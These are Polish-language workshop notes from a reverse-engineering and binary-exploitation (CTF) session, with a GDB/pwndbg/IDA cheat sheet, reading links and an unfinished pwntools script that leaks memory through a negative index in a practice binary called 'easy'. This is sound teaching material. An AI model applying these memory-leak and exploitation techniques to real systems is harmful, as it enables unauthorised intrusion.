
Przerobione zadania:
* http://re.disconnect3d.pl/logmein - proste zadanie z RE, które wymaga tak naprawdę zrobienia XORa dwóch stringów
* http://re.disconnect3d.pl/easy - zadanie z PWN, nieskończone - **do dokończenia w domu** -- cel - uruchomienie shella (docelowo zadanie było hostowane na zdalnym serwerze) - tutaj warto jest [początkowo wyłaczyć ASLR](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)

Komendy GDB z skrótami/wyjaśnieniem:
* r - run
* c - continue
* ni - next instruction
* si - step instruction
* p - print - tu można podać rejestr np. `print $eax` albo użyć wyrażenia, czy też castu z C - `print *((int*)$eax+3)`
* i r - info registers 
* info frame - wyświetlanie informacji o ramce stosu
* info functions [name] - wyświetlanie listy funkcji (lub filtrowanie gdy podamy nazwę)
* b <funkcja/adres> - stawianie breakpointa, gdy podajemy adres, należy poprzedzić go znakiem *
* jmp <funkcja/adres> - skok do danej funkcji/adresu (zmienia RIP/EIP)
* x - "egzaminowanie" pamięci, wykorzystywane wraz z formatem - np. `x/16xw <adres>` wyświetli 16 elementów dwubajtowych (specyfikator `w` - niefortunnie `word` w gdb to cztery bajty) z podanego adresu zapisanych heksadecymalnie (x) 

Komendy pwndbg:
* vmmap - wyświetlanie mapy pamięci (korzysta z `cat /proc/<pid>/maps`)
* search - szukanie w pamięci

Losowe hinty do Ida Pro/Hopper:
* Typy wyświetlane czasem przez Idę: BYTE (1B), WORD (2B), DWORD (4B), QWORD (8B)
* Klawisz 'n' na symbolu - refaktoryzacja jego nazwy
* Klawisz 'x' na symbolu - szukanie xrefów
* Klawisz 'y' na symbolu - zmiana jego typu (dla zdekompilowanego kodu)

## Rzeczy do zrobienia/przeczytania przed kolejnymi warsztatami:
* Wykłady z http://re.disconnect3d.pl/
* http://blog.exploitlab.net/2011/12/tutorials-to-refresh-your-fundamental.html
* https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/
* Dokończenie zadania `easy`, które robiliśmy - w razie problemów, piszcie - poniżej kod, który napisaliśmy na warsztatach

```python
from pwn import *

p = process('./easy')
print p.proc.pid
pause()

print p.recvuntil('Choose: ')

def leak(index):
    p.sendline('3')
    p.recvuntil('view:')
    p.sendline(str(index))
    p.recvuntil('Product ID: ')
    
    leak_id = p.recvuntil(', Product Code: ')[:-16]
    leak_code = p.recvuntil('There are ').replace('There are ','')
    leak = leak_code + p32(int(leak_id) & 0xffffffff)
    
    print "[+]Leak: "+ leak.encode('hex')
    return leak

leak(-3)

def add_product(prod_id, prod_code):
    p.sendline('1') # add record
    print p.recvuntil('Enter product ID: ')
    p.sendline(prod_id)
    print p.recvuntil('Enter product code: ')
    p.sendline(prod_code)

for i in range(7):
    add_product(str(i), chr(ord('a')+i)*8)

add_product('XxXx', 'abcdqwer')
p.interactive()
```
